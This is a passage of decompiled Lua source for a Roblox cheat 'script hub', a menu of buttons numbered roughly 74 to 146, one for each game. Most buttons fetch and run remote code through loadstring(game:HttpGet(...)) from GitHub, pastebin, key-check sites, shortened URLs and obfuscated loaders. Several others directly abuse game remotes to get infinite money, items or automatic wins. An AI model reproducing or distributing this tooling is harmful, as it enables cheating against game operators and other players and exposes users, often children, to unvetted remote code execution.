        Callback = function()
          -- line: [0, 0] id: 84
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "74. Hunting Season - Animals ESP (V To Turn On)",
        Callback = function()
          -- line: [0, 0] id: 287
          loadstring(game:HttpGet("https://pastebin.com/raw/iQUJRXAx"))()
        end,
      })
      r13_4:AddButton({
        Name = "Hunting Season - Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 141
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      r13_4:AddButton({
        Name = "75. Hide Or Die - Inf Crates, Coins, etc.",
        Callback = function()
          -- line: [0, 0] id: 600
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
        end,
      })
      r13_4:AddButton({
        Name = "76. Isle - Spine Ware",
        Callback = function()
          -- line: [0, 0] id: 610
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineWare/UniversalLoader/refs/heads/main/Load"))()
        end,
      })
      r13_4:AddButton({
        Name = "Isle - Isle Hack",
        Callback = function()
          -- line: [0, 0] id: 217
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EqueHub/islehack/refs/heads/main/islehack.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "77. Insane Elevator - Zephyr Hub",
        Callback = function()
          -- line: [0, 0] id: 674
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownlodfc/Zephyr/main/Zephyr%20%7C%20Insane%20Elevator"))()
        end,
      })
      r13_4:AddButton({
        Name = "78. Ice Tycoon - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 499
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/IceTycoon.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "79. Jujutsu Infinite - Native Hub (website to get the script)",
        Callback = function()
          -- line: [0, 0] id: 525
          setclipboard("https://getnative.cc/")
        end,
      })
      r13_4:AddButton({
        Name = "Jujutsu Infinite - Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 284
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/refs/heads/main/Jujutsu%20Infinite.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Jujutsu Infinite - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 246
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Infinite/refs/heads/main/All"))()
        end,
      })
      r13_4:AddButton({
        Name = "80. Jailbird - Nixks Hub",
        Callback = function()
          -- line: [0, 0] id: 400
          loadstring(game:HttpGet("https://pastebin.com/raw/taKWxmZe"))()
        end,
      })
      r13_4:AddButton({
        Name = "81. Karate - Auto Blocker",
        Callback = function()
          -- line: [0, 0] id: 740
          loadstring(game:HttpGet("https://pastebin.com/raw/yd2c8v9q"))()
        end,
      })
      r13_4:AddButton({
        Name = "82. Lootify - Pan Hub",
        Callback = function()
          -- line: [0, 0] id: 43
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Cheemos/PanHub/refs/heads/main/HubLoader"))()
        end,
      })
      r13_4:AddButton({
        Name = "Lootify - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 584
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/Lootify.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Lootify - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 618
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Loo/refs/heads/main/t"))()
        end,
      })
      r13_4:AddButton({
        Name = "Lootify - Fazium Hub",
        Callback = function()
          -- line: [0, 0] id: 433
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Fazium-files/main/Loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "83. Livetopia - Script For Trolling",
        Callback = function()
          -- line: [0, 0] id: 288
          loadstring(game:HttpGet("https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Live%20Topia%20GUI"))()
        end,
      })
      r13_4:AddButton({
        Name = "84. Light Game - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 137
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/LightGame.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "85. Lick Simulator - Autofarm",
        Callback = function()
          -- line: [0, 0] id: 198
          while wait() do
            local r0_198 = game:GetService("ReplicatedStorage")
            r0_198 = r0_198:WaitForChild("Remotes")
            r0_198:WaitForChild("Lick"):FireServer()
          end
        end,
      })
      r13_4:AddButton({
        Name = "86. Liar\'s Club - C0wka Hub",
        Callback = function()
          -- line: [0, 0] id: 85
          loadstring(game:HttpGet("https://raw.githubusercontent.com/cowka/c0wkaHub/refs/heads/main/Liars%20Club"))()
        end,
      })
      r13_4:AddButton({
        Name = "87. Laundry Simulator - Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 563
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "88. Mansion Tycoon - Bacon Boss Hub",
        Callback = function()
          -- line: [0, 0] id: 146
          loadstring(game:HttpGet("https://pastefy.app/y5a79l24/raw", true))()
        end,
      })
      r13_4:AddButton({
        Name = "89. Mega Mansion Tycoon - Very Good Script",
        Callback = function()
          -- line: [0, 0] id: 10
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CLANK-scriptservice/scripts/refs/heads/main/Mega%20Mansion%20Tycoon"))()
        end,
      })
      r13_4:AddButton({
        Name = "90. Merge For Speed - Very Good Script",
        Callback = function()
          -- line: [0, 0] id: 25
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Server15"))()
        end,
      })
      r13_4:AddButton({
        Name = "91. Mad City: Chapter 1 - Mad Lads",
        Callback = function()
          -- line: [0, 0] id: 604
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AdminEvilDRagon/Mad-Lads-V6-Revamp-GUI/refs/heads/main/Mad-Lads%20V6%20Revamp%20GUI"))()
        end,
      })
      r13_4:AddButton({
        Name = "Mad City: Chapter 1 - Script Hub",
        Callback = function()
          -- line: [0, 0] id: 437
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/Mad%20City%20Chapter%201%20Main%20Script", true))()
        end,
      })
      r13_4:AddButton({
        Name = "92. Meme Fruits - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 468
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/me/refs/heads/main/me"))()
        end,
      })
      r13_4:AddButton({
        Name = "93. Merge Toy - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 592
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/MergeToy.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "94. Midnight Chasers: Highway Racing - Nixius.xyz",
        Callback = function()
          -- line: [0, 0] id: 265
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/main/refs/heads/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "95. Math Murder - Auto Answer Questions",
        Callback = function()
          -- line: [0, 0] id: 543
          loadstring(game:HttpGet("https://pastebin.com/raw/Pk6UsbrA"))()
        end,
      })
      r13_4:AddButton({
        Name = "Math Murder - Reveal Answer",
        Callback = function()
          -- line: [0, 0] id: 765
          local r0_765 = workspace.Map.Functional.Screen.SurfaceGui.MainFrame.MainGameContainer.MainTxtContainer.QuestionText
          r0_765:GetPropertyChangedSignal("Text"):Connect(function()
            -- line: [0, 0] id: 766
            local r0_766 = r0_765.Text:gsub("=", ""):gsub("x", "*")
            local r1_766, r2_766 = pcall(function()
              -- line: [0, 0] id: 767
              return loadstring("return " .. r0_766)()
            end)
            task.wait()
            if r1_766 and type(r2_766) == "number" then
              r0_765.Text = r0_766:gsub("%*", "x") .. "= " .. r2_766
            end
          end)
        end,
      })
      r13_4:AddButton({
        Name = "Math Murder - Ghost Hub",
        Callback = function()
          -- line: [0, 0] id: 156
          loadstring(game:HttpGet("https://ghostplayer352.github.io/ScriptAuthorization/"))()
          Ioad("bee8432b10b76727a88e5815452851eb")
        end,
      })
      r13_4:AddButton({
        Name = "96. MotoRush! - Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 710
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "97. My Restaurant - Rafa Hub",
        Callback = function()
          -- line: [0, 0] id: 81
          loadstring(game:HttpGet("https://pastebin.com/raw/GDU7sA7Y"))()
        end,
      })
      r13_4:AddButton({
        Name = "98. MINGLE - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 570
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/MINGLE.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "99. Mining GO - FrostByte Hub",
        Callback = function()
          -- line: [0, 0] id: 485
          loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/refs/heads/main/FrostByte/Initiate.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "100. Ninja Time - Tora Hub",
        Callback = function()
          -- line: [0, 0] id: 122
          loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/NinjaTime"))()
        end,
      })
      r13_4:AddButton({
        Name = "Ninja Time - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 133
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/ni/refs/heads/main/ni"))()
        end,
      })
      r13_4:AddButton({
        Name = "102. No Scope Arcade - Aqua Hub",
        Callback = function()
          -- line: [0, 0] id: 628
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/Aqua-Hub/refs/heads/main/No-Scope%20Arcade.txt"))()
        end,
      })
      r13_4:AddButton({
        Name = "103. Nico\'s Nextbots - Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 23
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubNico\'snextbots"))()
        end,
      })
      r13_4:AddButton({
        Name = "Nico\'s Nextbots - Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 131
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "104. Ohio - Item Grabber",
        Callback = function()
          -- line: [0, 0] id: 185
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PUSCRIPTS/ITEM-GRABBER/refs/heads/main/item-grabber-by-pinguin-V1"))()
        end,
      })
      r13_4:AddButton({
        Name = "105. PLS Donate - Szze Hub",
        Callback = function()
          -- line: [0, 0] id: 761
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "106. Piggy - Get Things, Keys, etc.",
        Callback = function()
          -- line: [0, 0] id: 507
          loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Piggy - ESP Piggy, Players And More",
        Callback = function()
          -- line: [0, 0] id: 186
          local r0_186 = Instance.new("ScreenGui")
          local r1_186 = Instance.new("Frame")
          local r2_186 = Instance.new("TextLabel")
          local r3_186 = Instance.new("TextLabel")
          local r4_186 = Instance.new("TextButton")
          local r5_186 = Instance.new("TextLabel")
          r0_186.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
          r0_186.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
          r1_186.Parent = r0_186
          r1_186.BackgroundColor3 = Color3.new(1, 1, 1)
          r1_186.BorderColor3 = Color3.new(0, 0, 0)
          r1_186.BorderSizePixel = 0
          r1_186.Position = UDim2.new(0.265235633, 0, 0.288944721, 0)
          r1_186.Size = UDim2.new(0.468836576, 0, 0.374301672, 0)
          r2_186.Parent = r1_186
          r2_186.BackgroundColor3 = Color3.new(1, 1, 1)
          r2_186.BackgroundTransparency = 1
          r2_186.BorderColor3 = Color3.new(0, 0, 0)
          r2_186.BorderSizePixel = 0
          r2_186.Size = UDim2.new(1, 0, 0.558208942, 0)
          r2_186.Font = Enum.Font.Cartoon
          r2_186.Text = "IF ESP IS NOT WORKING IT NOT OUR ISSUE IT YOUR EXECUTOR ISSUE"
          r2_186.TextColor3 = Color3.new(0, 0, 0)
          r2_186.TextScaled = false
          r2_186.TextSize = 14
          r2_186.TextWrapped = true
          r3_186.Parent = r1_186
          r3_186.BackgroundColor3 = Color3.new(1, 1, 1)
          r3_186.BackgroundTransparency = 1
          r3_186.BorderColor3 = Color3.new(0, 0, 0)
          r3_186.BorderSizePixel = 0
          r3_186.Position = UDim2.new(0.351550967, 0, 0.558208942, 0)
          r3_186.Size = UDim2.new(0.295420974, 0, 0.149253726, 0)
          r3_186.Font = Enum.Font.Cartoon
          r3_186.Text = "Made by SolyNot"
          r3_186.TextColor3 = Color3.new(0, 0, 0)
          r3_186.TextScaled = true
          r3_186.TextSize = 14
          r3_186.TextWrapped = true
          r4_186.Parent = r1_186
          r4_186.BackgroundColor3 = Color3.new(1, 0, 0)
          r4_186.BackgroundTransparency = 1
          r4_186.BorderColor3 = Color3.new(0, 0, 0)
          r4_186.BorderSizePixel = 0
          r4_186.Position = UDim2.new(0.911373734, 0, 0, 0)
          r4_186.Size = UDim2.new(0.0886262953, 0, 0.149253726, 0)
          r4_186.Font = Enum.Font.SourceSans
          r4_186.Text = "X"
          r4_186.TextColor3 = Color3.new(1, 0.0666667, 0)
          r4_186.TextScaled = true
          r4_186.TextSize = 14
          r4_186.TextWrapped = true
          r5_186.Parent = r1_186
          r5_186.BackgroundColor3 = Color3.new(1, 1, 1)
          r5_186.BackgroundTransparency = 1
          r5_186.BorderColor3 = Color3.new(0, 0, 0)
          r5_186.BorderSizePixel = 0
          r5_186.Position = UDim2.new(0.0436165631, 0, 0.707462668, 0)
          r5_186.Size = UDim2.new(0.914114594, 0, 0.149253726, 0)
          r5_186.Font = Enum.Font.Cartoon
          r5_186.Text = "click X to exist"
          r5_186.TextColor3 = Color3.new(0, 0, 0)
          r5_186.TextScaled = true
          r5_186.TextSize = 14
          r5_186.TextWrapped = true
          coroutine.wrap(function()
            -- line: [0, 0] id: 187
            local r0_187 = Instance.new("Script", r4_186)
            r0_187.Parent.MouseButton1Click:Connect(function()
              -- line: [0, 0] id: 188
              r0_187.Parent.Parent.Parent:Destroy()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy-highlight.lua"))()
            end)
          end)()
        end,
      })
      r13_4:AddButton({
        Name = "107. Power Slap Simulator - Nami Hub",
        Callback = function()
          -- line: [0, 0] id: 371
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ByNami/dkhub/main/Script", true))()
        end,
      })
      r13_4:AddButton({
        Name = "108. Pressure Wash Simulator - Great Script",
        Callback = function()
          -- line: [0, 0] id: 250
          loadstring(game:HttpGet("https://rawscripts.net/raw/Pressure-Wash-Simulator-script-5637"))()
        end,
      })
      r13_4:AddButton({
        Name = "Pressure Wash Simulator - Inf Money \n(Wash First Something Then U Will Get Inf Money)",
        Callback = function()
          -- line: [0, 0] id: 337
          _G.Clean = true
          while _G.Clean do
            local r0_337 = wait(0.1)
            if r0_337 then
              game:GetService("ReplicatedStorage").Remotes.RefillRemote:FireServer(true)
              game:GetService("ReplicatedStorage").Remotes.SurfaceCompleted:FireServer(math.huge, math.huge)
              game:GetService("ReplicatedStorage").Remotes.ClientFrameData:FireServer(math.huge, true, true, math.huge)
            else
              break
            end
          end
        end,
      })
      r13_4:AddButton({
        Name = "109. Plane Crazy - PC Tools",
        Callback = function()
          -- line: [0, 0] id: 504
          loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/pcra", true))()
        end,
      })
      r13_4:AddButton({
        Name = "110. Pixel Slayer - FrostByte Hub",
        Callback = function()
          -- line: [0, 0] id: 255
          loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/refs/heads/main/FrostByte/Initiate.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "111. Pass Or Die - Auto Pass Bomb",
        Callback = function()
          -- line: [0, 0] id: 107
          -- notice: unreachable block#5
          local r0_107 = {
            "Forward",
            "Left",
            "Right"
          }
          while true do
            for r4_107, r5_107 in pairs(r0_107) do
              game:GetService("ReplicatedStorage").Rounds.Core.Default.Remotes.Pass:InvokeServer(unpack({
                [1] = r5_107,
              }))
            end
          end
        end,
      })
      r13_4:AddButton({
        Name = "112. Pet Story - God Hub (Key: G0DSeEyOu)",
        Callback = function()
          -- line: [0, 0] id: 113
          loadstring(game:HttpGet("https://pastebin.com/raw/wYAxD7n9"))()
        end,
      })
      r13_4:AddButton({
        Name = "113. Realistic Street Soccer - Verbal Hub",
        Callback = function()
          -- line: [0, 0] id: 645
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/refs/heads/main/Realistic%20Street%20Soccer%20Op%20Script", true))()
        end,
      })
      r13_4:AddButton({
        Name = "Realistic Street Soccer - Cheats.lol",
        Callback = function()
          -- line: [0, 0] id: 257
          loadstring(game:HttpGet("https://pastebin.com/raw/MS5Z1m8H"))()
        end,
      })
      r13_4:AddButton({
        Name = "114. Restaurant Tycoon 2 - Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 324
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "115. Rainbow Friends - King Hub",
        Callback = function()
          -- line: [0, 0] id: 625
          pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/zReal-King/Rainbow-Friends/main/Main.lua")))
        end,
      })
      r13_4:AddButton({
        Name = "Rainbow Friends - CH Hub",
        Callback = function()
          -- line: [0, 0] id: 78
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "116. Rob The Place - Script",
        Callback = function()
          -- line: [0, 0] id: 289
          loadstring(game:HttpGet("https://raw.githubusercontent.com/dqvh/dqvh/main/robtheplace.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "117. Raise A Floppa 2 - Leo Hub",
        Callback = function()
          -- line: [0, 0] id: 199
          loadstring(game:HttpGet("https://scriptblox.com/raw/raise-a-floppa-2-4x-Cash-Flopp-utofrm-7710"))()
        end,
      })
      r13_4:AddButton({
        Name = "118. Real Futbol 24 - Killa Hub",
        Callback = function()
          -- line: [0, 0] id: 699
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KillaIsTooGood/Killa/refs/heads/main/Hub"))()
        end,
      })
      r13_4:AddButton({
        Name = "119. RoCitizens - Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 642
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "120. Red Light, Green Light - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 711
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/RedLightGreenLight.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "121. Roblox Titanic - Titanic GUI",
        Callback = function()
          -- line: [0, 0] id: 256
          loadstring(game:HttpGet("https://raw.githubusercontent.com/pattingbabies/blora/main/titanicgui"))()
        end,
      })
      r13_4:AddButton({
        Name = "122. Shrimp Game - Nixius.xyz",
        Callback = function()
          -- line: [0, 0] id: 264
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/main/refs/heads/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Shrimp Game - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 571
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/ShrimpGame.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Shrimp Game - Moon X Hub",
        Callback = function()
          -- line: [0, 0] id: 213
          (loadstring or load)(game:HttpGet("https://raw.githubusercontent.com/MateoDev2024/MoonX/refs/heads/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "123. Stand Blox - Neyrone",
        Callback = function()
          -- line: [0, 0] id: 480
          loadstring(game:HttpGet("https://russianware.insane.rip/p/raw/h74dae1pn6"))()
        end,
      })
      r13_4:AddButton({
        Name = "124. Spider - Getting All Keys",
        Callback = function()
          -- line: [0, 0] id: 116
          loadstring(game:HttpGet("https://abre.ai/spider-lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "125. Survive Area 51 - Darkkrai",
        Callback = function()
          -- line: [0, 0] id: 362
          loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51", true))()
        end,
      })
      r13_4:AddButton({
        Name = "126. Scary Hide & Seek - Bacon Hacks",
        Callback = function()
          -- line: [0, 0] id: 309
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/refs/heads/main/ScaryHideSeek"))()
        end,
      })
      r13_4:AddButton({
        Name = "127. Streetz War 2 - Express Hub",
        Callback = function()
          -- line: [0, 0] id: 77
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "128. Street Life Remastered - Express Hub",
        Callback = function()
          -- line: [0, 0] id: 536
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "129. South Bronx: The Trenches - Express Hub",
        Callback = function()
          -- line: [0, 0] id: 294
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "South Bronx: The Trenches - Neptune Hub",
        Callback = function()
          -- line: [0, 0] id: 647
          loadstring(game:HttpGet("https://raw.githubusercontent.com/new-gugus/scouth-broux-neptune/refs/heads/main/main.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "130. Sonic Speed Simulator - Free Event Pets",
        Callback = function()
          -- line: [0, 0] id: 587
          for r3_587 = 1, 120, 1 do
            game:GetService("ReplicatedStorage").Knit.Services.MapStateService.RE.OnStateAction:FireServer(unpack({
              [1] = "AddEventCurrency",
              [2] = "Whisper",
              [3] = 10,
              [4] = true,
            }))
          end
        end,
      })
      r13_4:AddButton({
        Name = "131. Super Power League - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 352
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/supe/refs/heads/main/r"))()
        end,
      })
      r13_4:AddButton({
        Name = "132. Specter - Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 742
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      r13_4:AddButton({
        Name = "133. Spelling Bee - Herkle Hub",
        Callback = function()
          -- line: [0, 0] id: 616
          loadstring(game:HttpGet("https://raw.githubusercontent.com/decryp1/Herkle-Hub/refs/heads/main/game%20redirect"))()
        end,
      })
      r13_4:AddButton({
        Name = "Spelling Bee - Preppy Hub",
        Callback = function()
          -- line: [0, 0] id: 355
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PreppyHub/PreppyHub/refs/heads/main/SpellingBee"))()
        end,
      })
      r13_4:AddButton({
        Name = "134. Sell Water To Rule The World - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 599
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SellWaterToRULETHEWORLD.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "135. Scuba Diving at Quill Lake - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 646
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/ScubaDrivingatQuillLake.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "136. State Of Anarchy - Global Hub",
        Callback = function()
          -- line: [0, 0] id: 473
          getgenv().new_ui = true
          loadstring(game:HttpGet("https://shorturl.at/RNzPa"))()
        end,
      })
      r13_4:AddButton({
        Name = "137. Scary Sushi - Auto Make Sushi And More",
        Callback = function()
          -- line: [0, 0] id: 670
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NoWMoN/Scary-Sushi/main/.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "138. Squid Game Season 2 - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 471
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SquidGameSeason2.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "139. Squid Game X - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 664
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SquidGameX.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "140. Survival Odyssey - Pan Hub",
        Callback = function()
          -- line: [0, 0] id: 726
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Cheemos/PanHub/refs/heads/main/HubLoader"))()
        end,
      })
      r13_4:AddButton({
        Name = "Survival Odyssey - JJesqu Hub (Key: 25ms)",
        Callback = function()
          -- line: [0, 0] id: 676
          getgenv().KeyMode = 2
          getgenv().AllowAnyKey = true
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/KeyGuardianBeta"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/JJesqu/Hub/refs/heads/main/test", true))()
        end,
      })
      r13_4:AddButton({
        Name = "141. Snow Plow Simulator - Auto Farm, Inf Gems, etc.",
        Callback = function()
          -- line: [0, 0] id: 458
          loadstring(game:HttpGet("https://pastebin.com/raw/pyY9P87R"))()
        end,
      })
      r13_4:AddButton({
        Name = "142. The Storage - Inf Money",
        Callback = function()
          -- line: [0, 0] id: 230
          loadstring(game:HttpGet("https://rawscripts.net/raw/The-Storage-Infinite-Money-30212"))()
        end,
      })
      r13_4:AddButton({
        Name = "The Storage - Bacon Hacks",
        Callback = function()
          -- line: [0, 0] id: 623
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/refs/heads/main/thestorage.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "143. Theme Park Tycoon 2 - Script",
        Callback = function()
          -- line: [0, 0] id: 762
          loadstring(game:HttpGet("https://raw.githubusercontent.com/MaxproGlitcher/Script-Theme-Park-Tycoon-2/refs/heads/main/by%20MaxTheme-Park-Tycoon-2"))()
        end,
      })
      r13_4:AddButton({
        Name = "144. Total Roblox Drama - Syla Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 603
          loadstring(game:HttpGet("https://raw.githubusercontent.com/WeirdoSkid/Blank/refs/heads/main/Blank4"))()
        end,
      })
      r13_4:AddButton({
        Name = "Total Roblox Drama - Revi Hub",
        Callback = function()
          -- line: [0, 0] id: 349
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Have3165/Reviv3-Hub/refs/heads/main/ScriptCamp"))()
        end,
      })
      r13_4:AddButton({
        Name = "Total Roblox Drama - TRD GUI",
        Callback = function()
          -- line: [0, 0] id: 425
          loadstring(game:HttpGet("https://raw.githubusercontent.com/chrisesstuff/trdrobloxgui/refs/heads/main/obf", true))()
        end,
      })
      r13_4:AddButton({
        Name = "Total Roblox Drama - TRD Votecount",
        Callback = function()
          -- line: [0, 0] id: 778
          loadstring(game:HttpGet("https://pastebin.com/raw/GTi08jLd"))()
        end,
      })
      r13_4:AddButton({
        Name = "145. Tha Bronx 3 - Compound V",
        Callback = function()
          -- line: [0, 0] id: 380
          loadstring(game:HttpGet("https://rawscripts.net/raw/Tha-Bronx-2-COMPOUND-V-21195"))()
        end,
      })
      r13_4:AddButton({
        Name = "Tha Bronx 3 - Express Hub",
        Callback = function()
          -- line: [0, 0] id: 157
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "146. The Wild West - TWW LEAN",
        Callback = function()
          -- line: [0, 0] id: 535
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FSOCIETY-WYLD/TWWLEAN/main/main.lua", true))()
        end,
